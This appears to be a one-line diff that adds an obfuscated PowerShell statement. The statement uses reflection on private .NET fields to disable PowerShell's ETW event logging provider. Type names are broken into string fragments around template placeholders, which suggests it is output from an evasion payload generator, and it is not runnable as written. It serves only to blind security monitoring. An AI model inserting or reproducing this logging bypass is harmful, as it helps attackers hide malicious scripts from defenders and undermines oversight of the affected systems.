@@ -1,0 +1,1 @@
+[Reflection.Assembly]::LoadWithPartialName(""+<><System.Core<><+"").GetType("Sys"+<><tem.Diag<><+"nostics.E"+<><venting.Event<><+"Provider").GetField(""+<><m_<><+"enabled","NonPublic,Instance").SetValue([Ref].Assembly.GetType("Sys"+<><tem.Management.Automation.Tracing.PSEtw<><+"Log"+<><Provider<><+"").GetField(""+<><etwProvider<><+"","NonPublic,Static").GetValue(>><VAR1>><),0)
